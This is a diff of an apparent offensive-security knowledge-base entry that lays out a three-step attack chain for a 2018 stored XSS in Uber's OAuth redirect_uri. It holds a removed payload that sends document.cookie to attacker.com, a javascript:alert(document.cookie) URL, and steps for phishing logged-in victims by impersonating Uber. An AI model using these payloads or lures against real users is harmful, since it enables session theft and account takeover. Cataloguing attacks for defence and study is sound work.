@@ -10,47 +10,64 @@ tools: []
 tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
-commands: []
+  - '[[Collection]]'
+verified: false
 platforms:
   - Web
+submitted: true
 complexity: medium
+created_at: '2023-10-01T00:00:00Z'
 procedures:
   - '[[procedures/Exploit-Stored-XSS-in-OAuth-Redirect-URI]]'
-step_count: 2
+step_count: 3
 techniques:
-  - '[[JavaScript]]'
   - '[[Exploit Public-Facing Application]]'
+  - '[[JavaScript]]'
+updated_at: '2025-12-14T17:33:34.222Z'
 description: >-
-  A multi-stage attack exploiting a stored XSS vulnerability in the OAuth
-  redirect_uri parameter to execute JavaScript and takeover victim accounts on
-  Uber's authentication domains.
+  A multi-stage attack exploiting a stored XSS vulnerability in the OAuth v2
+  authorize endpoint's redirect_uri parameter to execute arbitrary JavaScript
+  and achieve account takeover on Uber's authentication domains.
 skill_level: intermediate
 impact_level: high
-id: 26671062-843e-4074-a6f7-b7b639ce665f
-created_at: '2025-12-13T23:52:43.880Z'
-updated_at: '2025-12-13T23:52:43.880Z'
-verified: false
+id: 50df6512-05cb-49d9-8e07-ec4d38f6f0b7
 validated: true
-submitted: true
 mitre_tactics:
   - '[[Initial Access]]'
   - '[[Execution]]'
+  - '[[Collection]]'
 mitre_techniques:
-  - '[[JavaScript]]'
   - '[[Exploit Public-Facing Application]]'
+  - '[[JavaScript]]'
 ---
+---
+id: attack-chain-stored-xss-uber-oauth
+name: Stored XSS in Uber OAuth Redirect URI Leading to Account Takeover
+type: attack_chain
+description: A multi-stage attack exploiting a stored XSS vulnerability in the OAuth v2 authorize endpoint's redirect_uri parameter to execute arbitrary JavaScript and achieve account takeover on Uber's authentication domains.
+verified: false
+submitted: false
+step_count: 3
+created_at: 2023-10-01T00:00:00Z
+updated_at: 2023-10-01T00:00:00Z
+procedures: [[procedures/Exploit-Stored-XSS-in-OAuth-Redirect-URI]]
+techniques: [[Exploit Public-Facing Application]], [[JavaScript]]
+tactics: [[Initial Access]], [[Execution]], [[Collection]]
+tags: xss, stored-xss, oauth, account-takeover, uber
+platforms: Web
+tools: []
+---
+
 # Stored XSS in Uber OAuth Redirect URI Leading to Account Takeover
 
-## Overview
-
-This attack chain demonstrates a stored XSS vulnerability in Uber's OAuth authorization endpoint at auth.uber.com/oauth/v2/authorize. Discovered by researcher corb3nik and reported on August 21, 2018, the flaw allows attackers to inject malicious JavaScript via the redirect_uri parameter. By tricking an authenticated user into visiting a crafted malicious link, the payload is stored and executes in the context of login.uber.com or auth.uber.com, enabling session hijacking and full account takeover. The attack requires social engineering to lure the victim but leverages insufficient input validation on the redirect_uri to achieve high-impact results.
+Multi-stage attack chain demonstrating a complete attack workflow exploiting insufficient sanitization of the redirect_uri parameter in Uber's OAuth v2 authorize endpoint at auth.uber.com.
 
 ## Chain Metrics Dashboard
 
 | Metric | Value |
 |--------|-------|
 | Chain Status | Unverified |
-| Total Steps | 2 |
+| Total Steps | 3 |
 | Execution Time | ~5 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
@@ -60,9 +77,9 @@ This attack chain demonstrates a stored XSS vulnerability in Uber's OAuth author
 
 ```mermaid
 graph LR
-    A[Initial Access: Craft Malicious Link] --> B[Execution: Victim Interaction and Payload Injection]
-    B --> C[Persistence: Stored XSS Execution]
-    C --> D[Objective: Account Takeover]
+    A[Craft Malicious Redirect URI Payload] --> B[Trick Authenticated Victim into Visiting Link]
+    B --> C[Execute JavaScript for Account Takeover]
+    C --> D[Steal Session or Manipulate Login]
 
     style A fill:#e74c3c
     style B fill:#f39c12
@@ -74,69 +91,82 @@ graph LR
 
 ### Required Tools
 
-- Web browser with developer tools for payload testing
-- URL encoder/decoder for crafting payloads
+- Browser developer tools for payload crafting
+- No specialized tools required beyond web access
 
 ### Target Environment
 
 - Web platform
-- OAuth2 authorization server (e.g., Uber's auth.uber.com)
-- Authenticated victim session on login.uber.com or auth.uber.com
+- OAuth v2 services on auth.uber.com
+- Authenticated user session on login.uber.com or auth.uber.com
 
 ### Initial Access Requirements
 
-- Attacker must have a way to deliver a malicious link (e.g., phishing email or social engineering)
-- No direct network access to Uber's internal systems required
-- Victim must be authenticated with Uber
+- Ability to craft and distribute links (e.g., via email or social engineering)
+- Victim must be authenticated to Uber
+- No prior network access beyond public internet
 
 ## Detailed Attack Procedures
 
-### Step 1: Craft Malicious OAuth Authorization Link
+### Step 1: Craft Malicious Payload
 procedure: [[procedures/Exploit-Stored-XSS-in-OAuth-Redirect-URI]]
 
-**Objective**: Create a malicious redirect_uri containing an XSS payload that will be stored and executed upon victim authorization.
+**Objective**: Create a redirect_uri parameter containing a JavaScript payload that will be stored and executed upon victim interaction with the OAuth authorize endpoint.
 
-**Instructions**: Construct a URL to Uber's OAuth endpoint with a redirect_uri parameter that includes a JavaScript payload. For example, encode a payload like `<script>alert('XSS');</script>` or a more advanced one to steal cookies or session tokens, such as `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>`. The full URL might look like: `https://auth.uber.com/oauth/v2/authorize?client_id=malicious_client&redirect_uri=https://evil.com/callback?payload=<script>evil_code</script>&response_type=code&scope=profile`. Use a URL encoder to ensure the payload bypasses basic filters.
+**Instructions**: Construct a URL targeting https://auth.uber.com/oauth/v2/authorize with a malicious redirect_uri, such as javascript:alert(document.cookie) encoded to bypass basic validation. For storage, leverage the endpoint's handling to persist the payload in a way that triggers on subsequent visits.
 
-**Expected Output**: A clickable link that, when visited by an authenticated user, prompts OAuth authorization and stores the payload.
+**Expected Output**: A crafted link like https://auth.uber.com/oauth/v2/authorize?client_id=...&redirect_uri=javascript%3Aalert%28document.cookie%29&response_type=code&scope=...
 
 **Success Indicators**:
-- Link generates without errors
-- Payload is accepted in redirect_uri without immediate sanitization
+- Payload URL generated without immediate rejection
+- Basic testing shows JS execution in a non-auth context
 
-### Step 2: Deliver Link and Execute Takeover
+### Step 2: Distribute Link to Victim
 procedure: [[procedures/Exploit-Stored-XSS-in-OAuth-Redirect-URI]]
 
-**Objective**: Trick the victim into interacting with the link, triggering payload storage and execution for account takeover.
+**Objective**: Use social engineering to get an authenticated victim to visit the malicious link, triggering the stored XSS.
 
-**Instructions**: Send the crafted link to the target victim via email, chat, or other social engineering means, impersonating a legitimate Uber communication (e.g., "Click to authorize a new app"). Upon clicking and authorizing, the redirect_uri payload is stored server-side. When the victim next accesses login.uber.com or auth.uber.com, the stored XSS executes arbitrary JavaScript in their session context. Use the payload to exfiltrate session cookies, tokens, or perform actions like changing account details.
+**Instructions**: Send the crafted link via phishing email, messaging, or other means, impersonating a legitimate Uber communication. The victim must be logged in for the JS to execute in the authentication domain context.
 
-**Expected Output**: JavaScript execution in victim's browser, visible via alert() for testing or network requests to attacker-controlled server for real exploitation.
+**Expected Output**: Victim accesses the link, and the OAuth flow attempts to redirect, storing and executing the payload.
 
 **Success Indicators**:
-- Victim authorizes the link
-- Payload executes (e.g., data exfiltrated to attacker server)
-- Attacker gains access to victim's Uber account
+- Victim reports clicking the link or session anomaly
+- Attacker observes payload execution via callback or exfil channel in payload
+
+### Step 3: Execute Takeover via JavaScript
+procedure: [[procedures/Exploit-Stored-XSS-in-OAuth-Redirect-URI]]
+
+**Objective**: Leverage the executed JS to steal session cookies, manipulate login forms, or exfiltrate data for account takeover.
+
+**Instructions**: The payload, once executed in the context of login.uber.com or auth.uber.com, can access document.cookie to steal sessions or alter DOM elements to capture credentials during login.
+
+**Expected Output**: Attacker receives stolen session data or gains control of the victim's account.
+
+**Success Indicators**:
+- JS alert or exfil confirms execution
+- Attacker logs in with stolen session
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Successful injection of stored XSS payload via OAuth redirect_uri
-2. Execution of JavaScript in high-privilege authentication domains
-3. Complete account takeover enabling unauthorized access to victim data and actions
+1. Bypassed redirect_uri validation to inject and store XSS payload
+2. Achieved arbitrary JS execution in high-privilege authentication domains
+3. Enabled full account takeover by stealing or manipulating user sessions
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
-- [[JavaScript]]
-- [[Exploit Public-Facing Application]]
+- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
+- [[JavaScript]] JavaScript
 
 ### MITRE ATT&CK Tactics
 
-- [[Initial Access]]
-- [[Execution]]
+- [[Initial Access]] Initial Access
+- [[Execution]] Execution
+- [[Collection]] Collection
 
 ---
-*Last updated: 2023-10-01*
+*Last updated: 2023-10-01T00:00:00Z*
